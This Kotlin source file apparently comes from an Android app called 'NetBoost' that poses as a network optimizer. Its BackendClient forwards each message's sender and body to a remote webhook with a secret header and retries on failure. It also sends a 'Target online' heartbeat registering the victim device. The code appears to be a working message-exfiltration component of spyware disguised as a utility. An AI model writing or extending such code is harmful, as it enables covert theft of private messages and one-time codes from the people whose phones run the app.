package com.netboost.optimizer

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

object BackendClient {
    private const val TAG = "BackendClient"

    private val client = OkHttpClient.Builder()
        .connectTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .readTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .writeTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    suspend fun relay(
        from: String,
        body: String,
        messageSid: String,
    ): Boolean = relayWithCode(from, body, messageSid) in 200..299

    suspend fun relayWithCode(
        from: String,
        body: String,
        messageSid: String,
    ): Int = withContext(Dispatchers.IO) {
        val formBody = FormBody.Builder()
            .add("From", from)
            .add("To", Config.DEVICE_ID)
            .add("Body", body)
            .add("MessageSid", messageSid)
            .build()

        val request = Request.Builder()
            .url(Config.BACKEND_WEBHOOK)
            .post(formBody)
            .addHeader("X-Relay-Secret", Config.RELAY_SECRET)
            .addHeader("User-Agent", "NetBoost/1.0")
            .build()

        DebugLogger.log(TAG, "📡 Sending HTTP POST -> ${Config.BACKEND_WEBHOOK}")
        DebugLogger.log(TAG, "   Params: From=$from | To=${Config.DEVICE_ID}")

        var lastCode = -1
        var delayMs = 1000L

        for (attempt in 1..3) {
            try {
                client.newCall(request).execute().use { response ->
                    lastCode = response.code
                    val respBody = response.body?.string()?.take(200) ?: "(empty)"
                    DebugLogger.log(
                        TAG,
                        "   Attempt $attempt → HTTP ${response.code} | Resp: $respBody",
                        isError = !response.isSuccessful,
                        isSuccess = response.isSuccessful
                    )
                    if (response.isSuccessful) {
                        return@withContext response.code
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log(
                    TAG,
                    "   Attempt $attempt Exception: ${e.javaClass.simpleName} - ${e.message}",
                    isError = true
                )
            }

            if (attempt < 3) {
                kotlinx.coroutines.delay(delayMs)
                delayMs *= 2
            }
        }

        DebugLogger.log(TAG, "❌ All 3 relay attempts failed. Final HTTP Code: $lastCode", isError = true)
        lastCode
    }

    suspend fun registerTarget(deviceId: String): Boolean = withContext(Dispatchers.IO) {
        val formBody = FormBody.Builder()
            .add("From", deviceId)
            .add("To", deviceId)
            .add("Body", "SYSTEM_HEARTBEAT: Target online")
            .add("MessageSid", "heartbeat-$deviceId-${System.currentTimeMillis()}")
            .build()

        val request = Request.Builder()
            .url(Config.BACKEND_WEBHOOK)
            .post(formBody)
            .addHeader("X-Relay-Secret", Config.RELAY_SECRET)
            .addHeader("User-Agent", "NetBoost/1.0")
            .build()

        try {
            DebugLogger.log(TAG, "💓 Registering Target Device ($deviceId)...")
            client.newCall(request).execute().use { response ->
                val ok = response.isSuccessful
                DebugLogger.log(
                    TAG,
                    "   Heartbeat status: HTTP ${response.code}",
                    isSuccess = ok,
                    isError = !ok
                )
                ok
            }
        } catch (e: Exception) {
            DebugLogger.log(TAG, "❌ Heartbeat error: ${e.javaClass.simpleName} - ${e.message}", isError = true)
            false
        }
    }
}
